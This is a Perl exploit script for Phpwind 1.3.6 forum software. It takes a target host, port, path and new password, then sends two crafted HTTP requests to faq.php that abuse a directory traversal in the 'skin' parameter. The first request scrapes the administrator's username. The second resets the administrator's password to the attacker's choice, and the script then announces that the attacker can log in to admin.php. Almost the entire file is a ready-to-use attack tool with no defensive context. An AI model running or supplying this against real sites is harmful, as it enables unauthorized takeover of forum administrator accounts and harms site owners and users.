#!/usr/bin/perl
#Phpwind 1.3.6 skin exploit
#Code by Alpha(netsh@163.com)
#Welcom To Http://www.cnwill.com/
#You can find the Message about this bug @
#http://www.54hack.info/txt/phpwind.doc

use IO::Socket;

system('cls');

if (@ARGV != 4) {
print "\n";
print "*****************************************************\n";
print "Thanks use this programme\n";
print "This is Phpwind 1.3.6 admin password exploit.\n\n";
print "Usage: \n $0 host port path adminpass \n\n";
print "e.g :\n $0 www.*.com 80 /bbs/ alpha\n";
print" $0 bbs.*.com 80 / alpha\n\n";
print "Code by Alpha,Welcome to WWW.CNWILL.COM!!\n";
print "*****************************************************\n";
exit(1);
}

$host = @ARGV[0];
$port = @ARGV[1];
$path = @ARGV[2];
$adminpass = @ARGV[3];

print "###### CODE BY Alpha,Welcome to WWW.CNWILL.COM ######\n\n";
$req = "GET $path"."faq.php?skin=../../admin/manager&tplpath=admin HTTP/1.1\n".
 "Host: $host\n".
 "Accept-Language: fr\n".
 "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\n".
 "Connection: close\n\n";


#print "$req1";
#exit;
print "###### Waitting,WE are getting the adminname...........\n\n";
@res = &connect;
#print @res;

$aaa =join ('',@res);
$po = index ($aaa, "name=username");
#print "$po\n";
$bbb=substr ($aaa,$po+28, $po+50);
@array = split("><",$bbb);
$adminname=@array[0];

print "###### Oh,WE got the adminname and it is $adminname\n\n";
print "###### Waitting,WE are charging the adminpassword as $adminpass................\n\n";


$req = "GET $path"."faq.php?skin=../../admin/manager&username=$adminname&password=$adminpass&check_pwd=$adminpass&action=go HTTP/1.1\n".
 "Host: $host\n".
 "Accept-Language: fr\n".
 "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\n".
 "Connection: close\n\n";


@res1 = &connect;

print "###### OK ,Now you can login as adminuser:$adminname and password:$adminpass @ \n\n###### $host$path"."admin.php \n\n###### GOOD LUCK,Welcome to WWW.CNWILL.COM!!\n";


sub connect{
my $connection = IO::Socket::INET->new(Proto =>"tcp",
                                PeerAddr =>$host,
                                PeerPort =>$port) || die "Sorry! Could not connect to $host \n";

print $connection $req;

my @res = <$connection>;
close $connection;
return @res;

}
